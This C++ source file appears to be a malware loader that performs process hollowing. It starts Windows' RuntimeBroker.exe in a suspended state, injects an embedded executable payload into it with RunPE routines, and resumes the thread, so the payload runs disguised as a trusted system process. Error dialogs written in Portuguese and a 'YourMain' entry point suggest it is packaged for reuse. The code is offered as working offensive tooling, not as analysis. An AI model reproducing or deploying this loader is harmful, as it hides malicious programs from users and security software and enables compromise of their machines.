#include <vector>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

#include "process_hollowing.h"
#include "exe_binary.h"

std::vector<unsigned char> GetRuntimeBrokerPath() {
	wchar_t buffer[MAX_PATH];
	UINT result = GetSystemDirectoryW(buffer, MAX_PATH);
	if (result == 0 || result > MAX_PATH) {
		return {};
	}
	std::wstring wPath = std::wstring(buffer) + L"\\RuntimeBroker.exe";
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), NULL, 0, NULL, NULL);
	std::vector<unsigned char> utf8_buffer(size_needed);
	WideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), reinterpret_cast<char*>(utf8_buffer.data()), size_needed, NULL, NULL);
	return utf8_buffer;
}

int LoadExeIntoMemory() {
    if (rawData == nullptr || payloadSize == 0) {
        MessageBox(0, "Erro: Nenhum payload carregado na memoria global", "Proxy Error", MB_ICONERROR);
        return -1;
    }
    LPVOID hFileContent = (LPVOID) rawData; 
    if (!IsValidPE(hFileContent)) {
        MessageBox(0, "Payload invalido (Nao e um PE valido)", "Proxy Error", MB_ICONERROR);
        return -1;
    }
    BOOL bPayloadIs32Bit = IsPE32(hFileContent);
    char lpTargetProcess[MAX_PATH];
    if (bPayloadIs32Bit) {
        strcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));
    } else {
        strcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));
    }
    STARTUPINFOA PI_StartupInfo;
    PROCESS_INFORMATION PI_ProcessInfo;
    memset(&PI_StartupInfo, 0, sizeof(PI_StartupInfo));
    memset(&PI_ProcessInfo, 0, sizeof(PI_ProcessInfo));
    PI_StartupInfo.cb = sizeof(PI_StartupInfo);
    if (!CreateProcessA(NULL, lpTargetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &PI_StartupInfo, &PI_ProcessInfo)) {
        MessageBox(0, "Erro ao criar processo alvo", "Proxy Error", MB_ICONERROR);
        return -1;
    }
    BOOL success = FALSE;
    if (bPayloadIs32Bit) {
        if (HasRelocation32(hFileContent)) {
            success = RunPEReloc32(&PI_ProcessInfo, hFileContent);
        } else {
            success = RunPE32(&PI_ProcessInfo, hFileContent);
        }
    } else {
        if (HasRelocation64(hFileContent)) {
            success = RunPEReloc64(&PI_ProcessInfo, hFileContent);
        } else {
            success = RunPE64(&PI_ProcessInfo, hFileContent);
        }
    }
    if (success) {
        ResumeThread(PI_ProcessInfo.hThread);
    } else {
        TerminateProcess(PI_ProcessInfo.hProcess, 0);
    }
}

void YourMain() {
    LoadExeIntoMemory();
}